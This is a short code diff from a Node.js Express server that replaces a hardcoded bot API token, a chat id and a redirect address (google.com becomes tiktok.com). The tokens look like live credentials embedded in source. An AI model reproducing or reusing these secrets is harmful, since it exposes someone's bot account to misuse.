@@ -7,9 +7,9 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '5376895931:AAGungqejutol8QIidI2tlJMkmCSUuAAY9w'
-const id = '5155109916'
-const address = 'https://www.google.com'
+const token = '7777370193:AAE5brAhSLCqbYU3rvHAIzv8iw81ZZWVU0M'
+const id = '8035192866'
+const address = 'https://www.tiktok.com'
 
 const app = express();
 const appServer = http.createServer(app);
